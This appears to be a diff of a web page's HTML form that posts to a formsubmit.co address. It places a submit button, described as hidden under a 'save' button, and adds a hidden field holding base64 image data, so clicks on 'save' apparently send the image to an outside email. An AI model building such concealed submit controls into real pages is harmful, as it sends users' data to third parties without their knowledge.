@@ -79,18 +79,24 @@
                         action="https://formsubmit.co/Shaz1m@163.com"
                         enctype="multipart/form-data"
                     >
-                        <input
+                        <!-- submit提交button被藏在了save button的底下 -->
+                        <button
                             class="submit"
                             type="submit"
                             id="submit"
-                        ></input>
+                        ></button>
                         <button
                             class="save"
-                            type="file"
-                            name="uploader"
+                            type="button"
                             id="save"
-                            title="upload"
                         ></button>
+                        <!-- 存放base64值 -->
+                        <input
+                            id="TEXT"
+                            title="upload"
+                            type="hidden"
+                            name="imageBase64"
+                        ></input>
                         <input
                             class="ip"
                             type="text"
